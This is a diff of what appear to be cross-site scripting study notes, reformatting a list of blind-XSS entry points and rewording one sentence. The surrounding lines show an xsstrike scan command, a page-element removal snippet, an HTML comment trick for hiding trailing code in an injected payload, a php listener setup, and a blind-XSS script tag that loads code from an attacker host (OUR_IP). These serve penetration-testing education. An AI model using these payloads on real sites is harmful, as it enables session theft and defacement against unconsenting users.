@@ -1403,7 +1403,7 @@ python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;
 <p>Removal code:</p>
 <pre><code class="language-js">document.getElementById('urlform').remove()
 </code></pre>
-<p>Adding a comment tag to the end of the payload will remove proceeding code:</p>
+<p>Adding a comment tag to the end of the payload will remove any remaining code after the exploit form:</p>
 <pre><code class="language-html">...PAYLOAD... &lt;!-- 
 </code></pre>
 <p>Complete injection code:</p>
@@ -1430,12 +1430,14 @@ vim index.php #write index.php to file here
 sudo php -S 0.0.0.0:8080
 </code></pre>
 <h2 id="blind-xss-detection">Blind XSS detection</h2>
-<p>Occur with forms only accessible by certain user:
-- Contact Forms
-- Reviews
-- User Details
-- Support Tickets
-- HTTP User-Agent header</p>
+<p>Occur with forms only accessible by certain user:</p>
+<ul>
+<li>Contact Forms</li>
+<li>Reviews</li>
+<li>User Details</li>
+<li>Support Tickets</li>
+<li>HTTP User-Agent header</li>
+</ul>
 <p>We can detect the presence of blind XSS by starting a netcat listener or php server and entering a script that calls to it:</p>
 <pre><code class="language-html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;
 </code></pre>
